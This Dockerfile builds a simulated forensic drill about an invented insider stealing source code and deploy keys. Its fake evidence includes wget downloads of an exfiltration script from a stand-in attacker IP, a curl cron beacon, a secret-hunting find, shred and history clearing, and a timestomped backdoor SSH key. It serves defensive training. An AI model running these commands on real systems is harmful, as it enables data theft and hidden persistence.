FROM ubuntu:22.04

LABEL maintainer="digital4security"
LABEL description="Advanced Drill 02 - Forensic Investigation (simulated evidence artifacts)"

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
    python3 \
    python3-pip \
    jq \
    curl \
    bash \
    && rm -rf /var/lib/apt/lists/*

RUN mkdir -p /forensics/evidence /forensics/scripts

# ── Collection metadata ───────────────────────────────────────────────────────
RUN cat > /forensics/evidence/collection_metadata.txt << 'EOF'
FORENSIC COLLECTION REPORT
===========================
Case Number:    CF-2024-0042
Subject:        Michael Kumar (mkumar), former Senior SysAdmin
Examiner:       Atlas Manufacturing IT Security
Collection Date: 2024-01-04 08:30:00 UTC
System:         SRV-BUILD-02 (Ubuntu 22.04.3 LTS, hostname: srv-build-02)
Collection Tool: dd + custom triage script
Evidence Bag:   EB-2024-0042-001

NOTES:
- System was live at time of collection (not powered off first)
- Volatile data (memory, network) captured before disk
- USB device physically removed by IT staff prior to analyst arrival
- USB device serial: SANDISK-USB3-SN20240103 (logged in udev)
EOF

# ── Evidence hashes ───────────────────────────────────────────────────────────
RUN cat > /forensics/evidence/hashes.txt << 'EOF'
# Evidence integrity hashes (SHA256)
# Verified at acquisition time and at analysis hand-off
a3f8b1c2d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1  disk_timeline.json
b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5  memory_snapshot.json
c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6  auth.log
d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7  audit.log
e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8  bash_history
f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9  usb_events.log
EOF

# ── Disk timeline (simulated MFT/ext4) ───────────────────────────────────────
RUN python3 -c "
import json
timeline = [
  {'ts':'2024-01-04T02:14:22Z','action':'SSH_LOGIN','path':None,'user':'mkumar','detail':'Accepted publickey for mkumar from 198.51.100.77 port 52201'},
  {'ts':'2024-01-04T02:14:35Z','action':'OPEN','path':'/home/mkumar/.ssh/authorized_keys','user':'mkumar','size':None},
  {'ts':'2024-01-04T02:14:40Z','action':'EXECVE','path':'/bin/bash','user':'mkumar','cmdline':'bash'},
  {'ts':'2024-01-04T02:15:01Z','action':'EXECVE','path':'/usr/bin/id','user':'mkumar','cmdline':'id'},
  {'ts':'2024-01-04T02:15:05Z','action':'EXECVE','path':'/bin/ls','user':'mkumar','cmdline':'ls /opt/build /var/repo'},
  {'ts':'2024-01-04T02:15:12Z','action':'OPEN','path':'/opt/build/src/','user':'mkumar','size':None},
  {'ts':'2024-01-04T02:15:18Z','action':'OPEN','path':'/var/repo/atlas-core/','user':'mkumar','size':None},
  {'ts':'2024-01-04T02:15:30Z','action':'EXECVE','path':'/usr/bin/find','user':'mkumar','cmdline':'find /opt/build -name *.key -o -name *secret* -o -name *.pem'},
  {'ts':'2024-01-04T02:15:45Z','action':'OPEN','path':'/opt/build/.env','user':'mkumar','size':4096,'note':'CI/CD secrets file'},
  {'ts':'2024-01-04T02:15:47Z','action':'OPEN','path':'/opt/build/deploy_rsa','user':'mkumar','size':1679,'note':'Production deployment SSH key'},
  {'ts':'2024-01-04T02:16:10Z','action':'EXECVE','path':'/usr/bin/wget','user':'mkumar','cmdline':'wget -q http://198.51.100.77/tools/exfil.sh -O /tmp/.x'},
  {'ts':'2024-01-04T02:16:12Z','action':'CREATE','path':'/tmp/.x','user':'mkumar','size':2048,'mode':'0700'},
  {'ts':'2024-01-04T02:16:14Z','action':'EXECVE','path':'/bin/chmod','user':'mkumar','cmdline':'chmod +x /tmp/.x'},
  {'ts':'2024-01-04T02:16:30Z','action':'EXECVE','path':'/usr/bin/tar','user':'mkumar','cmdline':'tar czf /home/mkumar/build_artifacts_export.tar.gz /opt/build /var/repo/atlas-core /etc/deploy_keys'},
  {'ts':'2024-01-04T02:18:45Z','action':'CREATE','path':'/home/mkumar/build_artifacts_export.tar.gz','user':'mkumar','size':2254857830,'note':'2.1 GB archive of source code + keys'},
  {'ts':'2024-01-04T02:19:00Z','action':'EXECVE','path':'/tmp/.x','user':'mkumar','cmdline':'/tmp/.x /home/mkumar/build_artifacts_export.tar.gz 198.51.100.77 8443'},
  {'ts':'2024-01-04T02:19:05Z','action':'SOCKET','user':'mkumar','dst_ip':'198.51.100.77','dst_port':8443,'bytes_out':2254857830,'note':'Outbound exfil connection'},
  {'ts':'2024-01-04T02:23:10Z','action':'USB_MOUNT','path':'/media/usb0','user':'root','detail':'SANDISK-USB3-SN20240103 mounted'},
  {'ts':'2024-01-04T02:23:20Z','action':'EXECVE','path':'/bin/cp','user':'mkumar','cmdline':'cp /home/mkumar/build_artifacts_export.tar.gz /media/usb0/'},
  {'ts':'2024-01-04T02:24:10Z','action':'CREATE','path':'/media/usb0/build_artifacts_export.tar.gz','user':'mkumar','size':2254857830,'note':'Copy to USB'},
  {'ts':'2024-01-04T02:24:30Z','action':'EXECVE','path':'/usr/bin/shred','user':'mkumar','cmdline':'shred -u /home/mkumar/build_artifacts_export.tar.gz'},
  {'ts':'2024-01-04T02:24:35Z','action':'DELETE','path':'/home/mkumar/build_artifacts_export.tar.gz','user':'mkumar','size':2254857830,'note':'Shredded + unlinked'},
  {'ts':'2024-01-04T02:24:40Z','action':'EXECVE','path':'/bin/rm','user':'mkumar','cmdline':'rm /tmp/.x'},
  {'ts':'2024-01-04T02:24:42Z','action':'DELETE','path':'/tmp/.x','user':'mkumar','size':2048},
  {'ts':'2024-01-04T02:24:45Z','action':'EXECVE','path':'/usr/bin/history','user':'mkumar','cmdline':'history -c'},
  {'ts':'2024-01-04T02:24:48Z','action':'TRUNCATE','path':'/home/mkumar/.bash_history','user':'mkumar','size':0},
  {'ts':'2024-01-04T02:24:50Z','action':'USB_UNMOUNT','path':'/media/usb0','user':'root'},
  {'ts':'2024-01-04T02:25:01Z','action':'SSH_LOGOUT','path':None,'user':'mkumar','detail':'session closed for user mkumar'},
  {'ts':'2024-01-04T02:25:05Z','action':'CRON_CREATE','path':'/var/spool/cron/crontabs/mkumar','user':'mkumar','detail':'*/30 * * * * curl -s http://198.51.100.77/beacon?h=$(hostname) >/dev/null 2>&1'},
  {'ts':'2024-01-04T02:14:20Z','action':'BACKDOOR_KEY','path':'/root/.ssh/authorized_keys','user':'root','detail':'ssh-rsa AAAAB3...mkumar-backdoor@atlas added','mtime_tampered': True, 'ctime':'2024-01-04T02:14:20Z','note':'TIMESTOMPED: mtime set to 2023-11-01 to hide addition'}
]
with open('/forensics/evidence/disk_timeline.json','w') as f:
    json.dump(timeline, f, indent=2)
print('disk_timeline.json written')
"

# ── Memory snapshot ───────────────────────────────────────────────────────────
RUN python3 -c "
import json
snapshot = {
  'collection_time': '2024-01-04T08:25:00Z',
  'processes': [
    {'pid':1,'ppid':0,'user':'root','cmd':'/sbin/init'},
    {'pid':800,'ppid':1,'user':'root','cmd':'/usr/sbin/sshd -D'},
    {'pid':1100,'ppid':1,'user':'root','cmd':'/usr/sbin/cron'},
    {'pid':1201,'ppid':1100,'user':'mkumar','cmd':'curl -s http://198.51.100.77/beacon?h=srv-build-02','deleted_exe':False,'note':'Cron beacon process'},
    {'pid':9001,'ppid':800,'user':'mkumar','cmd':'bash','deleted_exe':False,'note':'Residual SSH session shell'},
    {'pid':9050,'ppid':9001,'user':'mkumar','cmd':'/tmp/.deleted_tool','deleted_exe':True,'note':'DELETED BINARY still in memory — anti-forensics tool'}
  ],
  'network_connections': [
    {'pid':1201,'src':'10.10.0.5:60001','dst':'198.51.100.77:80','state':'TIME_WAIT','proto':'TCP'},
    {'pid':9050,'src':'10.10.0.5:60100','dst':'198.51.100.77:4444','state':'CLOSE_WAIT','proto':'TCP','note':'Residual reverse shell connection'}
  ],
  'open_files': [
    {'pid':9001,'fd':3,'path':'/home/mkumar/.bash_history','size':0,'note':'Truncated — history cleared'},
    {'pid':9050,'fd':1,'path':'/proc/9050/fd/1','note':'stdout of deleted tool'}
  ]
}
with open('/forensics/evidence/memory_snapshot.json','w') as f:
    json.dump(snapshot, f, indent=2)
print('memory_snapshot.json written')
"

# ── Auth log ──────────────────────────────────────────────────────────────────
RUN cat > /forensics/evidence/auth.log << 'EOF'
Jan  4 02:14:22 srv-build-02 sshd[8800]: Accepted publickey for mkumar from 198.51.100.77 port 52201 ssh2: RSA SHA256:zX9aB2cD4eF6gH8iJ0kL2mN4oP6qR8sT0uV2wX4yZ6a
Jan  4 02:14:22 srv-build-02 sshd[8800]: pam_unix(sshd:session): session opened for user mkumar by (uid=0)
Jan  4 02:25:01 srv-build-02 sshd[8800]: Disconnected from 198.51.100.77 port 52201
Jan  4 02:25:01 srv-build-02 sshd[8800]: pam_unix(sshd:session): session closed for user mkumar
EOF

# ── Bash history (reconstructed from auditd — original was cleared) ───────────
RUN cat > /forensics/evidence/bash_history << 'EOF'
# NOTE: Original .bash_history was truncated (shred -u + history -c)
# This reconstruction is from auditd EXECVE records
id
ls /opt/build /var/repo
ls -la /opt/build/
cat /opt/build/.env
cat /opt/build/deploy_rsa
find /opt/build -name "*.key" -o -name "*secret*" -o -name "*.pem"
wget -q http://198.51.100.77/tools/exfil.sh -O /tmp/.x
chmod +x /tmp/.x
tar czf /home/mkumar/build_artifacts_export.tar.gz /opt/build /var/repo/atlas-core /etc/deploy_keys
/tmp/.x /home/mkumar/build_artifacts_export.tar.gz 198.51.100.77 8443
cp /home/mkumar/build_artifacts_export.tar.gz /media/usb0/
shred -u /home/mkumar/build_artifacts_export.tar.gz
rm /tmp/.x
history -c
EOF

# ── auditd log ────────────────────────────────────────────────────────────────
RUN cat > /forensics/evidence/audit.log << 'EOF'
type=SYSCALL msg=audit(1704330862.001:1001): arch=c000003e syscall=59 success=yes uid=1001 exe="/bin/bash" key="exec_user"
type=EXECVE msg=audit(1704330862.001:1001): argc=1 a0="bash"
type=SYSCALL msg=audit(1704330875.002:1002): arch=c000003e syscall=59 success=yes uid=1001 exe="/usr/bin/tar" key="exec_user"
type=EXECVE msg=audit(1704330875.002:1002): argc=5 a0="tar" a1="czf" a2="/home/mkumar/build_artifacts_export.tar.gz" a3="/opt/build" a4="/var/repo/atlas-core"
type=SYSCALL msg=audit(1704330885.003:1003): arch=c000003e syscall=2 success=yes uid=1001 exe="/tmp/.x" key="exec_user"
type=PATH msg=audit(1704330885.003:1003): name="/home/mkumar/build_artifacts_export.tar.gz" nametype=NORMAL
type=SOCKADDR msg=audit(1704330885.004:1004): saddr=020020FBBF3300640000000000000000
type=SYSCALL msg=audit(1704330890.005:1005): arch=c000003e syscall=59 success=yes uid=1001 exe="/usr/bin/shred" key="exec_user"
type=EXECVE msg=audit(1704330890.005:1005): argc=3 a0="shred" a1="-u" a2="/home/mkumar/build_artifacts_export.tar.gz"
type=SYSCALL msg=audit(1704330892.006:1006): arch=c000003e syscall=87 success=yes uid=1001 exe="/bin/rm" key="exec_user"
type=PATH msg=audit(1704330892.006:1006): name="/tmp/.x" nametype=DELETE
type=SYSCALL msg=audit(1704330894.007:1007): arch=c000003e syscall=2 success=yes uid=1001 exe="/usr/bin/truncate" key="exec_user"
type=PATH msg=audit(1704330894.007:1007): name="/home/mkumar/.bash_history" nametype=NORMAL inode=12345
EOF

# ── USB events ────────────────────────────────────────────────────────────────
RUN cat > /forensics/evidence/usb_events.log << 'EOF'
Jan  4 02:23:10 srv-build-02 kernel: usb 1-1: new high-speed USB device number 7 using xhci_hcd
Jan  4 02:23:10 srv-build-02 kernel: usb 1-1: New USB device found, idVendor=0781, idProduct=5581, bcdDevice= 1.00
Jan  4 02:23:10 srv-build-02 kernel: usb 1-1: Product: Ultra USB 3.0
Jan  4 02:23:10 srv-build-02 kernel: usb 1-1: Manufacturer: SanDisk
Jan  4 02:23:10 srv-build-02 kernel: usb 1-1: SerialNumber: 20240103AA4F2B9C
Jan  4 02:23:11 srv-build-02 kernel: sd 6:0:0:0: [sdb] 60088320 512-byte logical blocks: (30.8 GB/28.6 GiB)
Jan  4 02:23:11 srv-build-02 udisksd[901]: Mounted /dev/sdb1 at /media/usb0 on behalf of uid 1001
Jan  4 02:24:50 srv-build-02 udisksd[901]: Unmounted /dev/sdb1 from /media/usb0 on behalf of uid 1001
Jan  4 02:24:50 srv-build-02 kernel: usb 1-1: USB disconnect, device number 7
EOF

# ── Network flow summary ──────────────────────────────────────────────────────
RUN python3 -c "
import json
flows = [
  {'ts':'2024-01-04T02:16:10Z','src':'10.10.0.5:45001','dst':'198.51.100.77:80','proto':'TCP','bytes_out':342,'bytes_in':2048,'note':'wget download of exfil.sh tool'},
  {'ts':'2024-01-04T02:19:05Z','src':'10.10.0.5:45100','dst':'198.51.100.77:8443','proto':'TCP','bytes_out':2254857830,'bytes_in':128,'duration_sec':242,'note':'2.1 GB outbound — data exfiltration'},
  {'ts':'2024-01-04T02:25:05Z','src':'10.10.0.5:60001','dst':'198.51.100.77:80','proto':'TCP','bytes_out':89,'bytes_in':22,'note':'Beacon check-in (cron)'}
]
with open('/forensics/evidence/netflow.json','w') as f:
    json.dump(flows, f, indent=2)
"

# ── Deleted file metadata ─────────────────────────────────────────────────────
RUN python3 -c "
import json
deleted = [
  {'filename':'build_artifacts_export.tar.gz','path':'/home/mkumar/build_artifacts_export.tar.gz',
   'inode':54321,'size':2254857830,'uid':1001,'created':'2024-01-04T02:18:45Z',
   'deleted':'2024-01-04T02:24:35Z','method':'shred -u','note':'Secure deletion — data irrecoverable; metadata preserved in filesystem journal',
   'tar_contents':['opt/build/ (source code, CI scripts, .env, API keys)','var/repo/atlas-core/ (core product repository, ~1.8GB)','etc/deploy_keys/ (deployment SSH private keys for prod and staging)']},
  {'filename':'.x','path':'/tmp/.x','inode':54400,'size':2048,'uid':1001,
   'created':'2024-01-04T02:16:12Z','deleted':'2024-01-04T02:24:40Z','method':'rm',
   'note':'Exfiltration script — small utility, contents unknown (not shredded, but blocks may be overwritten)'}
]
with open('/forensics/evidence/deleted_files.json','w') as f:
    json.dump(deleted, f, indent=2)
"

# ── SSH authorized_keys ───────────────────────────────────────────────────────
RUN cat > /forensics/evidence/authorized_keys_mkumar << 'EOF'
# mkumar's authorized_keys — NOTE: account should be disabled per HR termination
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9legitimate-key-from-old-laptop mkumar@atlas-workstation
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7zX9aB2c4eF6gH8i mkumar-backdoor@atlas
EOF

RUN cat > /forensics/evidence/authorized_keys_root << 'EOF'
# /root/.ssh/authorized_keys
# mtime TIMESTOMPED to 2023-11-01 to appear as pre-incident config
# ctime (inode change): 2024-01-04T02:14:20Z (ACTUAL modification time)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9sysadmin-team-key root-ops@atlas-corp
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7zX9aB2c4eF6gH8i mkumar-backdoor@atlas
EOF

# ── mkumar crontab ────────────────────────────────────────────────────────────
RUN cat > /forensics/evidence/mkumar_crontab << 'EOF'
# mkumar's crontab (installed during unauthorized session)
*/30 * * * * curl -s http://198.51.100.77/beacon?h=$(hostname) >/dev/null 2>&1
EOF

# ── known_hosts ───────────────────────────────────────────────────────────────
RUN cat > /forensics/evidence/ssh_known_hosts << 'EOF'
198.51.100.77 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...attacker-server-key
10.10.0.100 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...atlas-prod-server-key
10.10.0.101 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...atlas-staging-key
EOF

# ── proc snapshot ─────────────────────────────────────────────────────────────
RUN cat > /forensics/evidence/proc_snapshot.json << 'EOF'
{
  "collection_time": "2024-01-04T08:25:00Z",
  "processes": [
    {"pid":1201,"user":"mkumar","comm":"curl","cmdline":"curl -s http://198.51.100.77/beacon?h=srv-build-02","parent_pid":1100,"parent_comm":"cron"},
    {"pid":9050,"user":"mkumar","comm":".deleted_tool","exe":"(deleted)","cmdline":"/tmp/.deleted_tool","parent_pid":1,"note":"Orphaned process — binary deleted from disk"}
  ]
}
EOF

COPY scripts/ /forensics/scripts/

CMD ["/bin/bash"]
